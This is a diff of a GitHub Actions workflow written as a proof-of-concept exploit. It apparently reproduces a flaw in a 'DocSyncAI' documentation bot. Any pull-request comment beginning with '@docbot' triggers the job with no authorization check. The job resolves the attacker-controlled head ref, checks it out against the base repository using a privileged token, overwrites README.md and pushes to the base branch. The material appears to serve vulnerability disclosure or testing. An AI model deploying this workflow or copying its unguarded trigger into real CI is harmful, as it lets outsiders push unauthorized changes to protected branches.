@@ -4,35 +4,34 @@ on:
     types: [created]
 jobs:
   poc:
-    # mirrors DocSyncAI: any PR comment starting with @docbot, NO auth gate, NO approval (issue_comment)
     if: github.event.issue.pull_request && startsWith(github.event.comment.body, '@docbot')
     runs-on: ubuntu-latest
     permissions:
       contents: write
     steps:
-      - name: Resolve head.ref via PR API (as DocSyncAI does)
+      - name: "Resolve attacker-controlled head.ref via PR API"
         id: r
         env:
           GH_TOKEN: ${{ secrets.POC_PAT }}
         run: |
           BR=$(gh api /repos/${{ github.repository }}/pulls/${{ github.event.issue.number }} --jq .head.ref)
-          echo "attacker-controlled head.ref = $BR"
+          echo "head.ref = $BR"
           echo "branch=$BR" >> "$GITHUB_OUTPUT"
-      - name: Checkout that ref against BASE repo (no repository: -> base repo)
+      - name: "Checkout that ref against the base repo"
         uses: actions/checkout@v4
         with:
           token: ${{ secrets.POC_PAT }}
           ref: ${{ steps.r.outputs.branch }}
-      - name: Overwrite README.md and push origin HEAD (doc-confined, like DocSyncAI)
+      - name: "Overwrite README and push to base branch"
         run: |
-          cat > README.md <<EOF
-          # POC: unauthorized README overwrite
-          Written by the privileged PAT on base branch '${{ steps.r.outputs.branch }}'
-          Triggered by external comment from @${{ github.event.comment.user.login }} at $(date -u)
-          EOF
+          {
+            echo "# POC unauthorized README overwrite"
+            echo "Written by privileged PAT on base branch ${{ steps.r.outputs.branch }}"
+            echo "Triggered by external comment from @${{ github.event.comment.user.login }} at $(date -u)"
+          } > README.md
           git config user.name "docsync-bot"
           git config user.email "docsync-bot@example.com"
           git add README.md
-          git commit -m "poc: unauthorized README write driven by external @docbot comment"
-          echo "--- pushing to origin HEAD (= BASE branch '${{ steps.r.outputs.branch }}') ---"
+          git commit -m "poc unauthorized README write via external docbot comment"
+          echo "pushing to origin HEAD = base branch ${{ steps.r.outputs.branch }}"
           git push origin HEAD && echo "RESULT=PUSH_OK" || echo "RESULT=PUSH_REJECTED"
